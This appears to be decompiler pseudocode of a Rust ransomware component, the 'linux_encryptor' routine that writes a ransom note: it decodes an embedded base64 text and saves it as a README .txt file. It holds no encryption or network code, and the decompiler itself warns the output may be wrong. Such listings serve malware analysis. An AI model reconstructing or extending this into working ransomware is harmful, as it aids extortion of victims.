// positive sp value has been detected, the output may be wrong!
__int64 linux_encryptor::files::create_note()
{
  void *v0; // rsp
  __int64 v1; // rsi
  __int64 v2; // rax
  __int128 v3; // kr00_16
  __int64 v4; // rbx
  __int64 v5; // rbx
  const char *v6; // rcx
  __int64 v7; // rdx
  char v8; // si
  int v9; // edx
  int v10; // esi
  int v11; // ebx
  int v12; // edi
  __int64 v13; // rbx
  const char *v14; // rcx
  __int64 v15; // rdx
  char v16; // si
  int v17; // eax
  int v18; // edx
  int v19; // edi
  int v20; // esi
  int v21; // esi
  __int64 v22; // rax
  __int64 v23; // r14
  __int64 result; // rax
  __int128 v25; // [rsp-10C8h] [rbp-10E8h] BYREF
  __int64 v26; // [rsp-10B8h] [rbp-10D8h]
  const char *v27; // [rsp-10A8h] [rbp-10C8h]
  __int64 v28; // [rsp-10A0h] [rbp-10C0h]
  __int64 v29; // [rsp-1090h] [rbp-10B0h] BYREF
  __int128 v30; // [rsp-1088h] [rbp-10A8h] BYREF
  __int64 v31; // [rsp-1078h] [rbp-1098h]
  __int128 v32; // [rsp-1068h] [rbp-1088h]
  __int64 v33; // [rsp-1058h] [rbp-1078h]
  __int128 v34; // [rsp-1050h] [rbp-1070h]
  __int64 v35; // [rsp-1040h] [rbp-1060h]
  __m256i v36; // [rsp-1038h] [rbp-1058h] BYREF
  __int128 v37; // [rsp-1018h] [rbp-1038h]
  _BYTE v38[4096]; // [rsp-1008h] [rbp-1028h] BYREF
  __int16 v39; // [rsp-8h] [rbp-28h]

  v0 = alloca(_rust_probestack());
  <alloc::string::String as core::clone::Clone>::clone();
  v1 = v36.m256i_i64[2];
  if ( v36.m256i_i64[1] - v36.m256i_i64[2] <= 6uLL )
  {
    alloc::raw_vec::RawVec<T,A>::reserve::do_reserve_and_handle(&v36, v36.m256i_i64[2], 7LL);
    v1 = v36.m256i_i64[2];
  }
  v2 = v36.m256i_i64[0];
  *(_DWORD *)(v36.m256i_i64[0] + v1 + 3) = *(_DWORD *)&aReadme[3];
  *(_DWORD *)(v2 + v1) = *(_DWORD *)aReadme;
  v26 = v1 + 7;
  v25 = *(_OWORD *)v36.m256i_i8;
  core::str::converts::from_utf8();
  if ( v36.m256i_i64[0] )
  {
    v30 = *(_OWORD *)&v36.m256i_u64[1];
    core::result::unwrap_failed();
  }
  v3 = *(_OWORD *)&v36.m256i_u64[1];
  v4 = v26;
  if ( (unsigned __int64)(*((_QWORD *)&v25 + 1) - v26) < v36.m256i_i64[2] )
  {
    alloc::raw_vec::RawVec<T,A>::reserve::do_reserve_and_handle(&v25, v26, v36.m256i_i64[2]);
    v4 = v26;
  }
  memcpy((void *)(v4 + v25), (const void *)v3, *((size_t *)&v3 + 1));
  v5 = *((_QWORD *)&v3 + 1) + v4;
  v36.m256i_i64[2] = v5;
  *(_OWORD *)v36.m256i_i8 = v25;
  if ( (unsigned __int64)(*((_QWORD *)&v25 + 1) - v5) <= 3 )
  {
    alloc::raw_vec::RawVec<T,A>::reserve::do_reserve_and_handle(&v36, v5, 4LL);
    v5 = v36.m256i_i64[2];
  }
  *(_DWORD *)(v36.m256i_i64[0] + v5) = 1954051118;
  v33 = v5 + 4;
  v32 = *(_OWORD *)v36.m256i_i8;
  v6 = aW1diqvqgsefque;
  v7 = 746LL;
  do
  {
    if ( v6 == aErrorWhileWrit_2 )
      goto LABEL_54;
    v8 = *v6;
    if ( *v6 >= 0 )
    {
      ++v6;
    }
    else if ( (unsigned __int8)v8 < 0xE0u )
    {
      v6 += 2;
    }
    else if ( (unsigned __int8)v8 < 0xF0u )
    {
      v6 += 3;
    }
    else
    {
      if ( (((v8 & 7) << 18) | ((v6[1] & 0x3F) << 12) | ((v6[2] & 0x3F) << 6) | v6[3] & 0x3F) == 0x110000 )
        goto LABEL_54;
      v6 += 4;
    }
    --v7;
  }
  while ( v7 );
  if ( v6 == aErrorWhileWrit_2 )
    goto LABEL_54;
  v9 = *(unsigned __int8 *)v6;
  if ( (v9 & 0x80u) != 0 )
  {
    v10 = v9 & 0x1F;
    v11 = v6[1] & 0x3F;
    if ( (unsigned __int8)v9 <= 0xDFu )
    {
      v21 = v11 | (v10 << 6);
      v13 = 559LL;
      if ( v21 != 61 )
        goto LABEL_49;
      goto LABEL_25;
    }
    v12 = (v11 << 6) | v6[2] & 0x3F;
    if ( (unsigned __int8)v9 < 0xF0u )
    {
      v13 = 559LL;
      if ( ((v10 << 12) | v12) != 0x3D )
        goto LABEL_49;
      goto LABEL_25;
    }
    v9 = ((v9 & 7) << 18) | (v12 << 6) | v6[3] & 0x3F;
    if ( v9 == 1114112 )
LABEL_54:
      core::panicking::panic();
  }
  v13 = 559LL;
  if ( v9 != 61 )
    goto LABEL_49;
LABEL_25:
  v14 = aW1diqvqgsefque;
  v15 = 745LL;
  do
  {
    if ( v14 == aErrorWhileWrit_2 )
      goto LABEL_41;
    v16 = *v14;
    if ( *v14 >= 0 )
    {
      ++v14;
    }
    else if ( (unsigned __int8)v16 < 0xE0u )
    {
      v14 += 2;
    }
    else if ( (unsigned __int8)v16 < 0xF0u )
    {
      v14 += 3;
    }
    else
    {
      if ( (((v16 & 7) << 18) | ((v14[1] & 0x3F) << 12) | ((v14[2] & 0x3F) << 6) | v14[3] & 0x3F) == 0x110000 )
        goto LABEL_41;
      v14 += 4;
    }
    --v15;
  }
  while ( v15 );
  if ( v14 == aErrorWhileWrit_2 )
LABEL_41:
    core::panicking::panic();
  v17 = *(unsigned __int8 *)v14;
  if ( (v17 & 0x80u) != 0 )
  {
    v18 = v17 & 0x1F;
    v19 = v14[1] & 0x3F;
    if ( (unsigned __int8)v17 <= 0xDFu )
    {
      v17 = v19 | (v18 << 6);
    }
    else
    {
      v20 = (v19 << 6) | v14[2] & 0x3F;
      if ( (unsigned __int8)v17 < 0xF0u )
      {
        v17 = (v18 << 12) | v20;
      }
      else
      {
        v17 = ((v17 & 7) << 18) | (v20 << 6) | v14[3] & 0x3F;
        if ( v17 == 1114112 )
          goto LABEL_41;
      }
    }
  }
  v13 = 558LL - (v17 == 61);
LABEL_49:
  _rust_alloc_zeroed();
  if ( !v22 )
    alloc::alloc::handle_alloc_error();
  v23 = v22;
  *(_QWORD *)&v34 = v22;
  *((_QWORD *)&v34 + 1) = v13;
  v35 = v13;
  memset(v38, 0, sizeof(v38));
  v36.m256i_i64[0] = (__int64)aW1diqvqgsefque;
  v36.m256i_i64[1] = 747LL;
  v39 = 0;
  *(_OWORD *)&v36.m256i_u64[2] = 0LL;
  v37 = 0LL;
  ((void (__fastcall *)(__int128 *, __m256i *, __int64, __int64))<base64_stream::from_base64_reader::FromBase64Reader<R,N> as std::io::Read>::read)(
    &v25,
    &v36,
    v23,
    v13);
  if ( (_QWORD)v25 )
  {
    *(_QWORD *)&v30 = *((_QWORD *)&v25 + 1);
    core::result::unwrap_failed();
  }
  v31 = v33;
  v30 = v32;
  v26 = v35;
  v25 = v34;
  result = std::fs::write(&v30, &v25);
  v29 = result;
  if ( result )
  {
    *(_QWORD *)&v25 = &off_74150;
    *((_QWORD *)&v25 + 1) = 1LL;
    v26 = 0LL;
    v27 = aRustcFe5b13d68_0;
    v28 = 0LL;
    std::io::stdio::_print();
    return core::ptr::drop_in_place<std::io::error::Error>(&v29);
  }
  return result;
}
